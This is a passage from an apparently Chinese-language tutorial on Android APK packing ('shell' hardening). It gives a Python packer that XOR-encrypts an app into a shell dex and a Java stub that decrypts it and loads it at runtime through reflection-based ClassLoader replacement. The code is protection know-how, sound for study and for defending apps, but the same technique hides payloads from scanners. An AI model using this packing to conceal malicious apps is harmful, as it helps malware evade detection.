namespaces=self.ns)                if action is not None and category is not None:                    return activity.get(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;name&#39;)        return None    def getApplication(self):        return self.getTagAttribute(&#39;application&#39;, &#39;name&#39;)    def setApplication(self, application: str):        self.setTagAttribute(&#39;application&#39;, &#39;name&#39;, application)    def addMetaData(self, name: str, value: str):        self.addTagWithAttribute(&#39;application&#39;, &#39;meta-data&#39;, &#123;&#39;name&#39;: name, &#39;value&#39;: value&#125;)    def getManifestData(self):        &quot;&quot;&quot;返回XML字符串&quot;&quot;&quot;        return etree.tostring(self.tree, pretty_print=True, encoding=&#39;utf-8&#39;, xml_declaration=True).decode()# 合并壳dex和源apkdef combineShellDexAndSrcApk(sourceApkPath:Path, shellApkTempDir:Path, newApkTempDir:Path):    def fixCheckSum(dexBytesArray):        # dexfile[8:12]        # 小端存储        value = adler32(bytes(dexBytesArray[12:]))        valueArray = bytearray(value.to_bytes(4, &#39;little&#39;))        for i in range(len(valueArray)):            dexBytesArray[8 + i] = valueArray[i]    def fixSignature(dexBytesArray):        # dexfile[12:32]        sha_1 = sha1()        sha_1.update(bytes(dexBytesArray[32:]))        value = sha_1.hexdigest()        valueArray = bytearray(unhexlify(value))        for i in range(len(valueArray)):            dexBytesArray[12 + i] = valueArray[i]    def fixFileSize(dexBytesArray, fileSize):        # dexfile[32:36]        # 小端存储        fileSizeArray = bytearray(fileSize.to_bytes(4, &quot;little&quot;))        for i in range(len(fileSizeArray)):            dexBytesArray[32 + i] = fileSizeArray[i]    def encrypto(file):        for i in range(len(file)):            file[i] ^= 0xff        return file    # 获取源apk    with open(sourceApkPath, &#39;rb&#39;) as f:        SourceApkArray = bytearray(f.read())    # 获取shelldex    with open(shellApkTempDir / &#39;classes.dex&#39;, &#39;rb&#39;) as f:        shellDexArray = bytearray(f.read())    SourceApkLen = len(SourceApkArray)    shellDexLen = len(shellDexArray)    # 新的dex文件长度    newDexLen = shellDexLen + SourceApkLen + 4    # 加密源文件    enApkArray = encrypto(SourceApkArray)    # 新的dex文件内容 = 壳dex + 加密的源apk + 四字节标识加密后源apk大小长度    newDexArray = shellDexArray + enApkArray + bytearray(SourceApkLen.to_bytes(4, &#39;little&#39;))    # 修改filesize    fixFileSize(newDexArray, newDexLen)    # 修改signature    fixSignature(newDexArray)    # 修改checksum    fixCheckSum(newDexArray)    # 导出文件    with open(newApkTempDir / &#39;classes.dex&#39;, &#39;wb&#39;) as f:        f.write(newDexArray)# 提取源apk的Manifest文件,修改application为壳application(可能添加meta-data标签),输出新的Manifest文件def handleManifest(srcApkTempDir: Path, shellApkTempDir: Path, newApkTempDir: Path):    # 从源apk提取AndroidManifest.xml    with open(srcApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;r&#39;) as f:        srcManifestEditor = ManifestEditor(f.read().encode())    srcApplication = srcManifestEditor.getApplication()    # 从壳apk提取AndroidManifest.xml    with open(shellApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;r&#39;) as f:        shellManifestEditor = ManifestEditor(f.read().encode())    print(&#39;ShellApplication:&#39;, shellManifestEditor.getApplication())    # 修改源AndroidManifest.xml的application为壳的代理application    srcManifestEditor.setApplication(shellManifestEditor.getApplication())    # 写入meta-data标签 保存源apk的原始application    if srcApplication != None:        print(&#39;Source application:&#39;, srcApplication)        srcManifestEditor.addMetaData(&#39;APPLICATION_CLASS_NAME&#39;, srcApplication)    # 输出新的AndroidManifest.xml    with open(newApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;w&#39;) as f:        f.write(srcManifestEditor.getManifestData())def start(paths: Paths):    apktool = Apktool()    # 1.分别解包源文件和壳文件到临时目录    print(&#39;Extracting source and shell apk...&#39;)    apktool.extractApk(paths.srcApkPath, paths.srcApkTempDir)    print(&#39;Extract source apk success!&#39;)    print(&#39;Extracting shell apk...&#39;)    apktool.extractApk(paths.shellApkPath, paths.shellApkTempDir)    print(&#39;Extract shell apk success!&#39;)    # 2.复制源apk所有文件到新apk临时目录中    print(&#39;Copying source apk files to new apk temp dir...&#39;)    shutil.copytree(paths.srcApkTempDir, paths.newApkTempDir)    print(&#39;Copy source apk files success!&#39;)    # 3.处理AndroidManifest.xml    print(&#39;Handling AndroidManifest.xml...&#39;)    handleManifest(paths.srcApkTempDir, paths.shellApkTempDir, paths.newApkTempDir)    print(&#39;Handle AndroidManifest.xml success!&#39;)    # 4.合并壳dex和源apk并导出文件    print(&#39;Combining shell dex and source apk...&#39;)    combineShellDexAndSrcApk(paths.srcApkPath, paths.shellApkTempDir, paths.newApkTempDir)    print(&#39;Combine shell dex and source apk success!&#39;)    # 5.重打包apk    print(&#39;Repacking apk...&#39;)    apktool.repackApk(paths.newApkTempDir, paths.newApkPath)    print(&#39;Repack apk success!&#39;)    # 6.签名apk    print(&#39;Signing apk...&#39;)    apktool.signApk(paths.newApkPath)    print(&#39;Resign apk success!&#39;)    # 7.删除临时目录    print(&#39;Deleting temp directories...&#39;)    shutil.rmtree(paths.tmpdir)  # 删除临时目录    print(&#39;Delete temp directories success!&#39;)def main():    parser = argparse.ArgumentParser(description=&quot;Android APK Packer&quot;)    parser.add_argument(&#39;-src&#39;, &#39;--src-apk&#39;, required=True, type=Path, help=&#39;Path to source APK file&#39;)    parser.add_argument(&#39;-shell&#39;, &#39;--shell-apk&#39;, required=True, type=Path, help=&#39;Path to shell APK file&#39;)    parser.add_argument(&#39;-o&#39;, &#39;-out&#39;, &#39;--output-apk&#39;, type=Path,                        help=&#39;Output path for packed APK (Default: ./out/&lt;src-apk&gt;_protected.apk)&#39;)    args = parser.parse_args()    if args.output_apk == None:        args.output_apk = Path(&#39;./out&#39;) / (args.src_apk.stem + &#39;_protected.apk&#39;)  # 默认新apk名称及输出路径    paths = Paths(args.src_apk, args.shell_apk, args.output_apk)    print(&#39;Source APK:&#39;, paths.srcApkPath)    print(&#39;Shell APK:&#39;, paths.shellApkPath)    print(&#39;Output APK:&#39;, paths.newApkPath)    start(paths)if __name__ == &quot;__main__&quot;:    main()</code></pre><h5 id="脱壳程序"><a href="#脱壳程序" class="headerlink" title="脱壳程序"></a>脱壳程序</h5><h6 id="FirstProxyApplication-java"><a href="#FirstProxyApplication-java" class="headerlink" title="FirstProxyApplication.java"></a>FirstProxyApplication.java</h6><p>注意关闭Multidex支持，保证只生成一个Dex文件。</p><p><strong>attachBaseContext</strong> 中执行以下操作：</p><pre><code>1. 创建私有目录，用于保存释放的 dex，lib，源 APK；1. 调用 **readDexFromApk**， 从壳 APK 中提取壳 dex 文件，保存为字节数组；1. 调用 **extractSrcApkFromShellDex** 从壳 dex 文件提取源程序 APK 文件，解包 lib 文件到 lib 私有目录；1. 调用 **replaceClassLoader** 替换壳程序的 ClassLoader；新的 ClassLoader 指定了原 APK dex文件，lib 文件，odex 路径，也就是前面释放的原 APK 和原 lib</code></pre><p>onCreate 调用了 replaceApplication</p><ol><li>判断 manifest 文件是否通过 meta-data 标签保存了原 APK 的 application，如果原 APK 未指定 application，则使用默认的 application（即壳 application）；</li><li>如果原 APK 指定了自定义 application，则创建对应实例，替换掉壳的 application，之后调用 onCreate 方法。</li></ol><pre><code class="language-Java">package com.example.androidshell1;import android.app.Application;import android.app.Instrumentation;import android.content.Context;import android.content.pm.ApplicationInfo;import android.content.pm.PackageManager;import android.os.Bundle;import android.util.ArrayMap;import android.util.Log;import java.io.BufferedInputStream;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.lang.ref.WeakReference;import java.nio.ByteBuffer;import java.nio.ByteOrder;import java.util.ArrayList;import java.util.Iterator;import java.util.zip.ZipEntry;import java.util.zip.ZipInputStream;import dalvik.system.DexClassLoader;public class FirstProxyApplication extends  Application &#123;    private static final String TAG = &quot;NshIdE&quot;;    private String apkPath;    private String dexPath;    private String libPath;    public void log(String message)&#123;Log.d(TAG, message);&#125;    @Override    protected void attachBaseContext(Context base) &#123;        super.attachBaseContext(base);        log(&quot;FirstProxyApplication.attachBaseContext() running!&quot;);        try &#123;            //1.创建私有目录,保存dex,lib和源apk 具体路径为data/user/0/&lt;package_name&gt;/app_tmp_dex            File dex = getDir(&quot;tmp_dex&quot;, MODE_PRIVATE);            File lib = getDir(&quot;tmp_lib&quot;, MODE_PRIVATE);            dexPath = dex.getAbsolutePath();            libPath = lib.getAbsolutePath();            apkPath = dex.getAbsolutePath() + File.separator + &quot;Source.apk&quot;;            log(&quot;dexPath: &quot; + dexPath);            log(&quot;libPath: &quot; + libPath);            log(&quot;apkPath: &quot; + apkPath);            // 根据文件路径创建File对象            File apkFile = new File(apkPath);            // 只有首次运行时需要创建相关文件            if (!apkFile.exists()) &#123;                // 根据路径创建文件                apkFile.createNewFile();                //读取Classes.dex文件                byte[] shellDexData = readDexFromApk();                //从中分离出源apk文件                extractSrcApkFromShellDex(shellDexData);            &#125;            //配置加载源程序的动态环境,即替换mClassLoader            replaceClassLoader();        &#125; catch (Exception e) &#123;            Log.getStackTraceString(e);        &#125;    &#125;    // 从当前程序的apk读取dex文件并存储为字节数组    private byte[] readDexFromApk() throws IOException &#123;        //1.获取当前应用程序的源码路径(apk),一般是data/app目录下,该目录用于存放用户安装的软件        String sourceDir = this.getApplicationInfo().sourceDir;        log(&quot;this.getApplicationInfo().sourceDir: &quot; +sourceDir);        //2.创建相关输入流        FileInputStream fileInputStream = new FileInputStream(sourceDir);        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);        ZipInputStream zipInputStream = new ZipInputStream(bufferedInputStream); //用于解析apk文件        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); //用于存放dex文件        //3.遍历apk的所有文件并提取dex文件        ZipEntry zipEntry;        while((zipEntry = zipInputStream.getNextEntry()) != null)&#123; //存在下一个文件            // 将classes.dex文件存储到bytearray中 壳dex和源apk合并后只保留一个dex便于处理            if (zipEntry.getName().equals(&quot;classes.dex&quot;))&#123;                byte[] bytes = new byte[1024];                int num;                while((num = zipInputStream.read(bytes))!=-1)&#123;      //每次读取1024byte,返回读取到的byte数                    byteArrayOutputStream.write(bytes,0, num); //存放到开辟的byteArrayOutputStream中                &#125;            &#125;            zipInputStream.closeEntry(); //关闭当前文件        &#125;        zipInputStream.close();        log(&quot;Read dex from apk succeed!&quot;);        return byteArrayOutputStream.toByteArray(); //将读取到的dex文件以字节数组形式返回    &#125;    // 从壳dex文件中提取源apk并解析    private void extractSrcApkFromShellDex(byte[] shellDexData) throws IOException &#123;        int shellDexLen = shellDexData.length;        //开始解析dex文件        //1.读取源apk的大小        byte[] srcApkSizeBytes = new byte[4];        System.arraycopy(shellDexData, shellDexLen - 4, srcApkSizeBytes,0,4);        int srcApkSize =ByteBuffer.wrap(srcApkSizeBytes).order(ByteOrder.LITTLE_ENDIAN).getInt();//转成bytebuffer,方便4 bytes转int 将bytes转成int,加壳时,长度按小端存储        //2.读取源apk        byte[] sourceApkData = new byte[srcApkSize];        System.arraycopy(shellDexData, shellDexLen - srcApkSize - 4, sourceApkData, 0, srcApkSize);//注意减4        //3.解密源apk        sourceApkData = decrypt(sourceApkData);        //写入新建的apk文件中        File apkfile = new File(apkPath);        try &#123;            FileOutputStream apkfileOutputStream = new FileOutputStream(apkfile);            apkfileOutputStream.write(sourceApkData);            apkfileOutputStream.close();        &#125;catch (IOException e)&#123;            throw new IOException(e);        &#125;        //分析源apk,取出so文件放入libPath目录中        FileInputStream fileInputStream = new FileInputStream(apkfile);        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);        ZipInputStream zipInputStream = new ZipInputStream(bufferedInputStream);        ZipEntry nextEntry;        while ((nextEntry=zipInputStream.getNextEntry())!=null)&#123;            String name = nextEntry.getName();            if (name.startsWith(&quot;lib/&quot;) &amp;&amp; name.endsWith(&quot;.so&quot;))&#123;                //获取文件名并创建相应文件                String[] nameSplit = name.split(&quot;/&quot;);                String soFileStorePath = libPath + File.separator + nameSplit[nameSplit.length - 1];                File storeFile = new File(soFileStorePath);                storeFile.createNewFile();                //读数据到相应so文件中                FileOutputStream fileOutputStream = new FileOutputStream(storeFile);                byte[] bytes = new byte[1024];                int num;                while((num = zipInputStream.read(bytes))!=-1)&#123;                    fileOutputStream.write(bytes,0,num);                &#125;                fileOutputStream.flush();                fileOutputStream.close();            &#125;            zipInputStream.closeEntry();        &#125;        zipInputStream.close();    &#125;    // 解密函数    private byte[] decrypt(byte[] data) &#123;        for (int i = 0; i &lt; data.length; i++)&#123;            data[i] ^= (byte) 0xff;        &#125;        return data;    &#125;    // 替换壳App的ClassLoader为源App的ClassLoader    private void replaceClassLoader() &#123;        //1.获取当前的classloader        ClassLoader classLoader = this.getClassLoader();        log(&quot;Current ClassLoader: &quot; + classLoader.toString());        log(&quot;Parent ClassLoader: &quot; + classLoader.getParent().toString());        //2.反射获取ActivityThread        Object sCurrentActivityThreadObj = Reflection.getStaticField(&quot;android.app.ActivityThread&quot;,&quot;sCurrentActivityThread&quot;);        log(&quot;ActivityThread.sCurrentActivity: &quot; + sCurrentActivityThreadObj.toString());        //3.反射获取LoadedApk        //获取当前ActivityThread实例的mPackages字段 类型为ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt;, 里面存放了当前应用的LoadedApk对象        ArrayMap mPackagesObj = (ArrayMap) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mPackages&quot;);        log( &quot;mPackagesObj: &quot; + mPackagesObj.toString());        //获取mPackages中的当前应用包名        String currentPackageName = this.getPackageName();        log(&quot;currentPackageName: &quot; + currentPackageName);        // 获取loadedApk实例也有好几种,mInitialApplication mAllApplications mPackages        // 通过包名获取当前应用的loadedApk实例        WeakReference weakReference = (WeakReference) mPackagesObj.get(currentPackageName);        Object loadedApkObj = weakReference.get();        log( &quot;LoadedApk: &quot; + loadedApkObj.toString());        //4.替换ClassLoader        DexClassLoader dexClassLoader = new DexClassLoader(apkPath,dexPath,libPath, classLoader.getParent()); //动态加载源程序的dex文件,以当前classloader的父加载器作为parent        Reflection.setField(&quot;android.app.LoadedApk&quot;,&quot;mClassLoader&quot;,loadedApkObj,dexClassLoader); //替换当前loadedApk实例中的mClassLoader字段        log(&quot;New DexClassLoader: &quot; + dexClassLoader);    &#125;    //替换壳程序LoadedApk的Application为源程序Application,并调用其onCreate方法    public boolean replaceApplication()&#123;        // Application实例存在于: LoadedApk.mApplication        // 以及ActivityThread的mInitialApplication和mAllApplications和mBoundApplication        //判断源程序是否使用自定义Application 若使用则需要进行替换,若未使用则直接返回,使用壳的默认Application即可        String appClassName = null; //源程序的Application类名        try &#123;            //获取AndroidManifest.xml 文件中的 &lt;meta-data&gt; 元素            ApplicationInfo applicationInfo = getPackageManager().getApplicationInfo(this.getPackageName(), PackageManager.GET_META_DATA);            Bundle metaData = applicationInfo.metaData;            //获取xml文件声明的Application类            if (metaData != null &amp;&amp; metaData.containsKey(&quot;APPLICATION_CLASS_NAME&quot;))&#123;                appClassName = metaData.getString(&quot;APPLICATION_CLASS_NAME&quot;);            &#125; else &#123;                log(&quot;源程序中没有自定义Application&quot;);                return false; //如果不存在直接返回,使用壳的application即可            &#125;        &#125; catch (PackageManager.NameNotFoundException e) &#123;            log(Log.getStackTraceString(e));        &#125;        //源程序存在自定义application类,开始替换        log(&quot;Try to replace Application&quot;);        //1.反射获取ActivityThread实例        Object sCurrentActivityThreadObj = Reflection.getStaticField(&quot;android.app.ActivityThread&quot;,&quot;sCurrentActivityThread&quot;);        log(&quot;ActivityThread: &quot; + sCurrentActivityThreadObj.toString());        //2.获取并设置LoadedApk        //获取mBoundApplication (AppBindData对象)        Object mBoundApplicationObj = Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mBoundApplication&quot;) ;        log(&quot;mBoundApplication: &quot;+mBoundApplicationObj.toString());        //获取mBoundApplication.info (即LoadedApk)        Object infoObj = Reflection.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplicationObj,&quot;info&quot;);        log( &quot;LoadedApk: &quot; + infoObj.toString());        //把LoadedApk的mApplication设置为null,这样后续才能调用makeApplication() 否则由于已存在Application,无法进行替换        Reflection.setField(&quot;android.app.LoadedApk&quot;,&quot;mApplication&quot;,infoObj,null);        //3.获取ActivityThread.mInitialApplication 即拿到旧的Application(对于要加载的Application来讲)        Object mInitialApplicationObj = Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mInitialApplication&quot;);        log(&quot;mInitialApplicationObj: &quot; + mInitialApplicationObj.toString());        //4.获取ActivityThread.mAllApplications并删除旧的application        ArrayList&lt;Application&gt; mAllApplicationsObj = (ArrayList&lt;Application&gt;) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mAllApplications&quot;);        mAllApplicationsObj.remove(mInitialApplicationObj);        log(&quot;mInitialApplication 从 mAllApplications 中移除成功&quot;);        //5.重置相关类的Application类名 便于后续创建Application        //获取LoadedApk.mApplicationInfo        ApplicationInfo applicationInfo = (ApplicationInfo) Reflection.getField(&quot;android.app.LoadedApk&quot;,infoObj,&quot;mApplicationInfo&quot;);        log( &quot;LoadedApk.mApplicationInfo: &quot; + applicationInfo.toString());        //获取mBoundApplication.appInfo        ApplicationInfo appinfoInAppBindData = (ApplicationInfo) Reflection.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplicationObj,&quot;appInfo&quot;);        log(&quot;ActivityThread.mBoundApplication.appInfo: &quot; + appinfoInAppBindData.toString());        //此处通过引用修改值,虽然后续没有使用,但是实际上是修改其指向的LoadedApk相关字段的值        //设置两个appinfo的classname为源程序的application类名,以便后续调用makeApplication()创建源程序的application        applicationInfo.className = appClassName;        appinfoInAppBindData.className = appClassName;        log(&quot;Source Application name: &quot; + appClassName);        //6.反射调用makeApplication方法创建源程序的application        Application application = (Application) Reflection.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,infoObj,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;false,null&#125;); //使用源程序中的application        //Application app = (Application)ReflectionMethods.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,infoObj,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;true,null&#125;); //使用自定义的application 强制为系统默认        log(&quot;Create source Application succeed: &quot;+application);        //7.重置ActivityThread.mInitialApplication为新的Application        Reflection.setField(&quot;android.app.ActivityThread&quot;,&quot;mInitialApplication&quot;,sCurrentActivityThreadObj,application);        log(&quot;Reset ActivityThread.mInitialApplication by new Application succeed!&quot;);        //8.ContentProvider会持有代理的Application,需要特殊处理一下        ArrayMap mProviderMap = (ArrayMap) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mProviderMap&quot;);        log(&quot;ActivityThread.mProviderMap: &quot; + mProviderMap);        //获取所有provider,装进迭代器中遍历        Iterator iterator = mProviderMap.values().iterator();        while(iterator.hasNext())&#123;            Object providerClientRecord = iterator.next();            //获取ProviderClientRecord.mLocalProvider,可能为空            Object mLocalProvider = Reflection.getField(&quot;android.app.ActivityThread$ProviderClientRecord&quot;,providerClientRecord,&quot;mLocalProvider&quot;) ;            if(mLocalProvider != null)&#123;                log(&quot;ProviderClientRecord.mLocalProvider: &quot; + mLocalProvider);                //获取ContentProvider中的mContext字段,设置为新的Application                Reflection.setField(&quot;android.content.ContentProvider&quot;,&quot;mContext&quot;,mLocalProvider,application);            &#125;        &#125;        log( &quot;Run Application.onCreate&quot; );        application.onCreate(); //源程序,启动!        return true;    &#125;    @Override    public void onCreate() &#123;        super.onCreate();        log(&quot;ProxyApplication.onCreate() is running!&quot;);        if(replaceApplication())            log(&quot;Replace application succeed!&quot;);    &#125;&#125;</code></pre><h6 id="Reflection-java"><a href="#Reflection-java" class="headerlink" title="Reflection.java"></a>Reflection.java</h6><pre><code class="language-Java">package com.example.androidshell1;import android.util.Log;import java.lang.reflect.Field;import java.lang.reflect.Method;public class Reflection &#123;    private static final String TAG = &quot;NshIdE&quot;;    public static Object invokeStaticMethod(String class_name,String method_name,Class&lt;?&gt;[] parameterTypes,Object[] parameterValues)&#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name); //反射获取Class类对象            Method method = clazz.getMethod(method_name,parameterTypes);//反射获取方法            method.setAccessible(true);//突破权限访问控制            return method.invoke(null,parameterValues);//反射调用,静态方法无需指定所属实例,直接传参即可        &#125;catch (Exception e)&#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;    public static Object invokeMethod(String class_name,String method_name,Object obj,Class&lt;?&gt;[] parameterTypes,Object[] parameterValues)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Method method = clazz.getMethod(method_name,parameterTypes);            method.setAccessible(true);//突破权限访问控制            return method.invoke(obj,parameterValues);// 反射调用,动态方法需要指定所属实例        &#125;catch (Exception e)        &#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;    public static Object getField(String class_name,Object obj,String field_name)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            return field.get(obj);  //获取实例字段,需要指定实例对象        &#125;catch(Exception e)        &#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;    public static Object getStaticField(String class_name,String field_name)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            return field.get(null);        &#125;catch (Exception e)        &#123;            Log.d(TAG, e.toString());            return null;        &#125;    &#125;    public static void setField(String class_name,String field_name,Object obj,Object value)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            field.set(obj,value);        &#125;catch (Exception e)        &#123;            Log.d(TAG, e.toString());        &#125;    &#125;    public static void setStaticField(String class_name,String field_name,Object value)    &#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name);            Field field = clazz.getDeclaredField(field_name);            field.setAccessible(true);            field.set(null,value);        &#125;catch (Exception e)&#123;            Log.d(TAG, e.toString());        &#125;    &#125;&#125;</code></pre><h6 id="AndroidManifest-xml-1"><a href="#AndroidManifest-xml-1" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h6><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt;    &lt;application        android:allowBackup=&quot;true&quot;        android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot;        android:fullBackupContent=&quot;@xml/backup_rules&quot;        android:icon=&quot;@mipmap/ic_launcher&quot;        android:label=&quot;@string/app_name&quot;        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;        android:supportsRtl=&quot;true&quot;        android:theme=&quot;@style/Theme.AndroidShell1&quot;        android:name=&quot;com.example.androidshell1.FirstProxyApplication&quot;&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>​        但是这里脚本略有问题，就是在加载原 APK 的 so 的时候，会存在覆盖的情况，也就是说每次打包加壳生成的 APK，只支持一种 ABI，尽管该 APK 的 lib 目录下有四种 ABI 对应的 so，但是在运行动态加载的时候 会出问题。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>​        整体加固——落地加载的核心思路就是将源程序 APK 和 壳 dex 进行合并，运行时动态解密并执行相关环境处理操作，重新执行原 APK 的代码。</p><ul><li><p>优点：易于实现；</p></li><li><p>缺点：由于文件落地加载，所以非常容易在文件系统中获取到源程序 APK；两次加载原程序 APK 到内存，效率低。</p></li></ul><h4 id="二代壳-整体加固（不落地加载）"><a href="#二代壳-整体加固（不落地加载）" class="headerlink" title="二代壳-整体加固（不落地加载）"></a>二代壳-整体加固（不落地加载）</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        针对落地加载的部分问题，引申出了不落地加载的思路： 即直接加载内存中的dex字节码，避免释放文件。</p><p>​        如何在内存中加载dex？<strong>Android 8</strong> 及以上系统中,可以使用系统提供的 <strong>InMemoryDexClassLoader</strong> 实现内存加载，Android7及以下则需要手动实现。</p><p>​        另外需要针对第一代加固不支持Multidex进行优化：源apk每个 dex 文件前添加 <strong>4 字节</strong>标识其大小，之后全部合并成一个文件再合并到壳 dex，最后添加 4 字节标识文件总大小。</p><p>结构如下：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821103600951.png" alt="image-20250821103600951"></p><h5 id="源程序-1"><a href="#源程序-1" class="headerlink" title="源程序"></a>源程序</h5><p>同一代加固，可开启Multidex支持，其他部分不变。</p><h5 id="加壳程序-1"><a href="#加壳程序-1" class="headerlink" title="加壳程序"></a>加壳程序</h5><p>主要改动如下：</p><ol><li><p>调用 <strong>combineShellAndSourceDexs</strong> 合并壳 dex 和源dex。内部调用 <strong>readAndCombineDexs</strong> 读取并合并源 apk 的<strong>多个 dex</strong> 为一个文件。</p></li><li><p>复制原 APK 文件时忽略 Manifest 和 dex 文件。</p><pre><code class="language-Java">shutil.copytree(paths.srcApkTempDir,paths.newApkTempDir,ignore=shutil.ignore_patterns(&#39;AndroidManifest.xml&#39;,&#39;classes*.dex&#39;))</code></pre></li><li><p>ManifeseEditor。添加 <strong>getEtractNativeLibs</strong>，获取application 标签的 <strong>android:extractNativeLibs</strong> 属性值</p><p>添加 <strong>resetExtractNativeLibs</strong>，<strong>重置extractNativeLibs&#x3D;true</strong> 强制释放 lib 文件。</p></li><li><p>handleManifest。判断源程序 Manifest 是否设置了android:extractNativeLibs&#x3D;”true”，若为 false(默认)则改为true。</p></li></ol><pre><code class="language-python">from zlib import adler32from hashlib import sha1from binascii import unhexlifyfrom lxml import etreeimport subprocessimport shutilfrom pathlib import Pathimport argparse# 封装path类,保存全局用到的路径class Paths:    def __init__(self, srcApk: Path, shellApk: Path, outputApk: Path):        # Apk file paths        self.srcApkPath = srcApk.resolve()  # 解析为绝对路径        self.shellApkPath = shellApk.resolve()        self.newApkPath = outputApk.resolve()        # Temp directories default python file path        self.tmpdir = Path(__file__).parent / &#39;temp&#39;        self.srcApkTempDir = self.tmpdir / &#39;srcApkTemp&#39;        self.shellApkTempDir = self.tmpdir / &#39;shellApkTemp&#39;        self.newApkTempDir = self.tmpdir / &#39;newApkTemp&#39;# Apktool类 提供解包,打包,签名功能class Apktool:    def __init__(self):        self.apktool_path = Path(__file__).parent.parent / &#39;tools/apktool/apktool.bat&#39;        self.signer_path = Path(__file__).parent / &#39;tools/uber-apk-signer-1.3.0.jar&#39;    def signApk(self, unsignedApkPath: Path):        self.runCommand([&#39;java&#39;, &#39;-jar&#39;, self.signer_path, &#39;--apk&#39;, unsignedApkPath])    # 使用apktool解包apk 只解包资源不解包dex    def extractApk(self, apkPath: Path, outputDir: Path):        self.runCommand([self.apktool_path, &#39;d&#39;, apkPath, &#39;-s&#39;, &#39;-o&#39;, outputDir])    # 重打包apk    def repackApk(self, inputDir: Path, outApk: Path):        self.runCommand([self.apktool_path, &#39;b&#39;, inputDir, &#39;-o&#39;, outApk])    def runCommand(self, args):        subprocess.run(args, stdout=subprocess.DEVNULL)  # 仅调用工具,不需要输出,重定向stdout到os.devnull        # 参数列表 捕获输出 输出转为字符串        # print(subprocess.run(args,  capture_output=True,text=True).stdout)# AndroidManifest.xml的editor 用于获取和修改标签属性,以及添加标签class ManifestEditor:    def __init__(self, xml_content: bytes):        self.ns = &#123;&#39;android&#39;: &#39;http://schemas.android.com/apk/res/android&#39;&#125;        self.tree = etree.fromstring(xml_content)    # 获取指定标签的android属性值 examples: get_attr(&#39;application&#39;, &#39;name&#39;) get_attr(&#39;activity&#39;, &#39;name&#39;)    def getTagAttribute(self, tag_name: str, attr_name: str):        if tag_name == &#39;manifest&#39;:  # 根标签特殊处理            elem = self.tree            if elem is not None:                return elem.get(f&#39;&#123;attr_name&#125;&#39;)  # 寻找标签的属性        else:            elem = self.tree.find(f&#39;.//&#123;tag_name&#125;&#39;, namespaces=self.ns)            if elem is not None:                return elem.get(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;attr_name&#125;&#39;)  # 根标签之外的属性位于android命名空间下        return None    # 设置指定标签的属性值 example:set_attr(&#39;application&#39;,&#39;name&#39;,&quot;com.example.ProxyApplication&quot;)    def setTagAttribute(self, tag_name: str, attr_name: str, new_value: str):        if tag_name == &#39;manifest&#39;:  # 根标签特殊处理            elem = self.tree            if elem is not None:                return elem.set(f&#39;&#123;attr_name&#125;&#39;, new_value)  # 设置属性值        else:            elem = self.tree.find(f&#39;.//&#123;tag_name&#125;&#39;, namespaces=self.ns)            if elem is not None:                elem.set(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;attr_name&#125;&#39;, new_value)                return True        return False    # 在指定父标签下添加新子标签 example: add_tag(&#39;application&#39;,&quot;meta-data&quot;,&#123;&#39;name&#39;: &#39;android.permission.CAMERA&#39;,&#39;value&#39;:&#39;hello&#39;&#125;)    def addTagWithAttributes(self, parent_tag: str, new_tag: str, attrs: dict):        if parent_tag == &#39;manifest&#39;:            parent = self.tree            if parent is not None:                new_elem = etree.SubElement(parent, new_tag)                for k, v in attrs.items():  # 支持一次给添加的标签设置多个属性                    new_elem.set(f&#39;&#123;k&#125;&#39;, v)                return True        else:            parent = self.tree.find(f&#39;.//&#123;parent_tag&#125;&#39;, namespaces=self.ns)            if parent is not None:                new_elem = etree.SubElement(parent, new_tag)                for k, v in attrs.items():                    